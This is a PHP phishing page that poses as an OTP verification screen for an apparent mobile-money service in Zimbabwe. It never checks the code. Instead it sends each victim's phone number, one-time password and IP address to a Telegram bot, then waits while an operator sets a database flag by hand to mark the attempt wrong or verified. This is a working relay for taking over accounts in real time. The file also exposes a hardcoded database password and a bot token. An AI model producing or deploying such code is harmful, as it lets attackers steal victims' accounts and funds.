<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

// Telegram configuration
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

/**
 * Send Telegram message
 */
function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => $parseMode
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    
    // fallback
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// Must have phone in session (set by login.php)
if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = trim($_SESSION['phone']);
$error = '';

// Process OTP submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    // We ignore the actual OTP digits – only the database flag matters
    $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
    $enteredOtp = implode('', $otpArray);
    $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
    
    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    if (!$conn) {
        $error = "System error. Please contact administrator.";
        error_log("PostgreSQL connection failed in otp.php");
    } else {
        // Ensure `users` table exists with all required columns
        $createSQL = "
            CREATE TABLE IF NOT EXISTS users (
                phone VARCHAR(20) PRIMARY KEY,
                status INTEGER DEFAULT 0,
                pin INTEGER DEFAULT 0,
                otp INTEGER DEFAULT 0,
                logout INTEGER DEFAULT 0,
                error_processing INTEGER DEFAULT 0
            )
        ";
        pg_query($conn, $createSQL);
        
        // Add error_processing column if it doesn't exist (for existing tables)
        $alterSQL = "ALTER TABLE users ADD COLUMN IF NOT EXISTS error_processing INTEGER DEFAULT 0";
        @pg_query($conn, $alterSQL);
        
        // Insert phone if not exists
        $insertSQL = "INSERT INTO users (phone, status, pin, otp, logout) 
                      VALUES ($1, 0, 0, 0, 0) 
                      ON CONFLICT (phone) DO NOTHING";
        pg_query_params($conn, $insertSQL, [$phone]);
        
        // Send Telegram notification about OTP submission
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $time = date('Y-m-d H:i:s');
        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
        sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
        
        // Return success to AJAX
        header('Content-Type: application/json');
        echo json_encode(['success' => true]);
        exit;
    }
}

// Helper to mask phone for display
$maskedPhone = substr(preg_replace('/\D/', '', $phone), 0, 3) . "****" . substr(preg_replace('/\D/', '', $phone), -2);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f5f7fa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
}

.container {
    width: 100%;
    max-width: 500px;
    background: #fff;
    padding: 24px 20px 32px;
    border-radius: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,.1);
}

h2 {
    margin-top: 0;
    margin-bottom: 8px;
    font-size: 24px;
}

p {
    color: #6b7280;
    margin-bottom: 28px;
    font-size: 15px;
}

.message-area {
    min-height: 60px;
    margin-bottom: 20px;
}

.status-message {
    padding: 10px;
    border-radius: 8px;
    text-align: center;
    font-size: 14px;
    transition: all 0.3s ease;
    display: none;
}

.status-message.show {
    display: block;
}

.status-verifying {
    background: #e0f2fe;
    color: #0284c7;
    border-left: 4px solid #0284c7;
}

.status-wrong {
    background: #fee2e2;
    color: #dc2626;
    border-left: 4px solid #dc2626;
}

.status-error {
    background: #fef3c7;
    color: #d97706;
    border-left: 4px solid #d97706;
}

.otp-box {
    display: flex;
    justify-content: center;
    gap: 12px;
    flex-wrap: wrap;
}

.otp-box input {
    width: calc(16% - 8px);
    min-width: 45px;
    max-width: 65px;
    aspect-ratio: 1 / 1;
    font-size: 24px;
    text-align: center;
    border-radius: 12px;
    border: 2px solid #2563eb;
    background: white;
    font-weight: 600;
    padding: 0;
    outline: none;
    transition: 0.2s;
}

.otp-box input:focus {
    border-color: #1e40af;
    box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
}

.otp-box input:disabled {
    background: #f3f4f6;
    border-color: #d1d5db;
    cursor: not-allowed;
}

button {
    margin-top: 32px;
    width: 100%;
    padding: 14px;
    font-size: 18px;
    border: none;
    border-radius: 40px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
}

button:hover {
    background: #1d4ed8;
}

button:disabled {
    background: #9ca3af;
    cursor: not-allowed;
}

.timer {
    margin-top: 24px;
    text-align: center;
    color: #6b7280;
    font-size: 14px;
}

.timer a {
    color: #2563eb;
    text-decoration: none;
}

@media (max-width: 480px) {
    .container {
        padding: 20px 16px 28px;
    }
    .otp-box {
        gap: 8px;
    }
    .otp-box input {
        min-width: 42px;
        font-size: 20px;
    }
}

@media (max-width: 380px) {
    .otp-box {
        gap: 6px;
    }
    .otp-box input {
        min-width: 38px;
        font-size: 18px;
    }
}
</style>
</head>
<body>

<div class="container">
    <h2>OTP Verification</h2>
    <p>Enter the OTP sent to your phone number<br>
        <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
    </p>

    <div class="message-area">
        <div id="statusMessage" class="status-message"></div>
    </div>

    <form id="otpForm">
        <div class="otp-box">
            <?php for ($i = 0; $i < 6; $i++): ?>
                <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
            <?php endfor; ?>
        </div>
        <button type="submit" id="submitBtn">Submit</button>
    </form>

    <div class="timer" id="timer">Resend OTP in 120 seconds</div>
</div>

<script>
const inputs = document.querySelectorAll('.otp-box input');
const submitBtn = document.getElementById('submitBtn');
const statusDiv = document.getElementById('statusMessage');
const form = document.getElementById('otpForm');
let monitoringInterval = null;
let isProcessing = false;
let hasRedirected = false;
let errorTimeout = null;
let lastOtpValue = null;

// Auto-check database status every 2 seconds (only after submission)
function checkDatabaseStatus() {
    if (hasRedirected) return;
    
    console.log('Checking database status...'); // Debug log
    
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: 'check_status=1'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Status check response:', data); // Debug log
        
        if (data.success) {
            const otpValue = data.otp_value;
            
            // Only update if value has changed
            if (lastOtpValue !== otpValue) {
                lastOtpValue = otpValue;
                console.log('OTP value changed to:', otpValue); // Debug log
                
                // Check the OTP database value
                if (otpValue === 0) {
                    // Still verifying - keep showing "verifying" message
                    showMessage('🔍 Verifying...', 'status-verifying', false);
                } else if (otpValue === 1) {
                    // Wrong OTP detected
                    showMessage('❌ Wrong OTP', 'status-wrong', true);
                    // Disable inputs
                    inputs.forEach(input => input.disabled = true);
                    submitBtn.disabled = true;
                    // Stop monitoring
                    if (monitoringInterval) {
                        clearInterval(monitoringInterval);
                        monitoringInterval = null;
                    }
                    isProcessing = false;
                    lastOtpValue = null;
                } else if (otpValue === 2) {
                    // OTP verified - redirect
                    showMessage('✅ OTP Verified! Redirecting...', 'status-verifying', false);
                    // Stop monitoring
                    if (monitoringInterval) {
                        clearInterval(monitoringInterval);
                        monitoringInterval = null;
                    }
                    hasRedirected = true;
                    
                    // Check logout status before redirecting
                    setTimeout(() => {
                        if (data.logout_status === 1) {
                            window.location.href = 'loggedin.php';
                        } else {
                            window.location.href = 'dashboard.php';
                        }
                    }, 1000);
                }
            } else {
                // Keep showing current message without flashing
                if (otpValue === 0 && statusDiv.classList.contains('status-verifying')) {
                    // Message already showing, do nothing
                }
            }
        }
    })
    .catch(error => {
        console.error('Error checking status:', error);
    });
}

// Helper function to show message with auto-hide for wrong OTP
function showMessage(message, type, autoHide = false) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message show ${type}`;
    
    if (autoHide) {
        if (errorTimeout) clearTimeout(errorTimeout);
        errorTimeout = setTimeout(() => {
            statusDiv.classList.remove('show');
            // Re-enable inputs for retry
            inputs.forEach(input => input.disabled = false);
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit';
            // Clear the OTP inputs for retry
            inputs.forEach(input => input.value = '');
            inputs[0].focus();
            // Reset processing flag
            isProcessing = false;
            // Clear last value to allow new monitoring
            lastOtpValue = null;
        }, 3000);
    }
}

// Clear any existing error timeout
function clearErrorTimeout() {
    if (errorTimeout) {
        clearTimeout(errorTimeout);
        errorTimeout = null;
    }
}

// OTP input handling
inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });

    input.addEventListener('keydown', e => {
        if (e.key === "Backspace" && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

inputs[0].focus();

// Handle form submission
form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    if (isProcessing) return;
    
    // Get entered OTP
    let otpValue = '';
    inputs.forEach(input => {
        otpValue += input.value;
    });
    
    if (otpValue.length !== 6) {
        showMessage('❌ Please enter complete 6-digit OTP', 'status-wrong', true);
        return;
    }
    
    // Clear any previous messages and timeouts
    clearErrorTimeout();
    statusDiv.classList.remove('show');
    
    isProcessing = true;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';
    
    // Disable inputs while processing
    inputs.forEach(input => input.disabled = true);
    
    // Prepare form data
    const formData = new FormData();
    inputs.forEach((input, idx) => {
        formData.append('otp[]', input.value);
    });
    
    // Submit the form via AJAX
    fetch(window.location.href, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Submit response:', data); // Debug log
        
        if (data.success) {
            // Start monitoring database status
            showMessage('🔍 Verifying...', 'status-verifying', false);
            lastOtpValue = 0; // Set initial value
            
            // Start checking every 2 seconds
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
            }
            monitoringInterval = setInterval(checkDatabaseStatus, 2000);
            checkDatabaseStatus(); // Check immediately
        } else {
            showMessage('❌ Submission failed. Please try again.', 'status-wrong', true);
            // Re-enable inputs
            inputs.forEach(input => input.disabled = false);
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit';
            isProcessing = false;
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showMessage('⚠️ Network error. Please try again.', 'status-error', true);
        // Re-enable inputs
        inputs.forEach(input => input.disabled = false);
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit';
        isProcessing = false;
    });
});

// Timer functionality
let time = 120;
const timer = document.getElementById("timer");

const timerInterval = setInterval(() => {
    if (time > 0) {
        time--;
        timer.innerText = "Resend OTP in " + time + " seconds";
    } else {
        clearInterval(timerInterval);
        timer.innerHTML = '<a href="resend.php">Resend OTP</a>';
    }
}, 1000);
</script>

<?php
// Handle AJAX status check requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' && isset($_POST['check_status'])) {
    
    header('Content-Type: application/json');
    header('Cache-Control: no-cache, must-revalidate');
    
    if (!isset($_SESSION['phone'])) {
        echo json_encode(['success' => false, 'error' => 'No phone in session']);
        exit;
    }
    
    $phone = trim($_SESSION['phone']);
    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    
    if (!$conn) {
        echo json_encode(['success' => false, 'error' => 'DB connection failed']);
        exit;
    }
    
    $sql = "SELECT otp, logout FROM users WHERE phone = $1";
    $result = pg_query_params($conn, $sql, [$phone]);
    
    if ($result && $row = pg_fetch_assoc($result)) {
        $otpValue = (int)$row['otp'];
        $logoutStatus = (int)$row['logout'];
        
        echo json_encode([
            'success' => true, 
            'otp_value' => $otpValue,
            'logout_status' => $logoutStatus
        ]);
    } else {
        echo json_encode(['success' => false, 'error' => 'User not found']);
    }
    exit;
}
?>

</body>
</html>
